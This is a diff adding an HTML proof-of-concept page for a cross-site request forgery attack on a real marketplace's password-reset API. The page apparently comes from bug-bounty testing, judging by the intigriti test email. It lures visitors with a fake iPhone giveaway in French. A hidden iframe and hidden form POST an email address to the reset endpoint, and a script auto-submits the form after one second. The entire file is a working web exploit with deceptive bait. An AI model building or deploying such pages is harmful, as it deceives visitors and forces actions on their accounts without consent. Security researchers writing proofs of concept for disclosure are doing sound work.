@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - Iframe Method</title>
+</head>
+<body>
+    <h1>Gagnez un iPhone ! 🎁</h1>
+    <p>Cliquez sur le bouton ci-dessous</p>
+    
+    <iframe name="hidden-iframe" style="display:none;"></iframe>
+    
+    <form id="csrf-form" action="https://www.vinted.fr/api/v2/users/reset_password" 
+          method="POST" target="hidden-iframe">
+        <input type="hidden" name="email" value="raz_26+2@intigriti.me" />
+        <button type="submit">Réclamez votre cadeau !</button>
+    </form>
+
+    <script>
+        // Auto-submit après 1 seconde (optionnel)
+        setTimeout(function() {
+            document.getElementById('csrf-form').submit();
+        }, 1000);
+    </script>
+</body>
+</html>
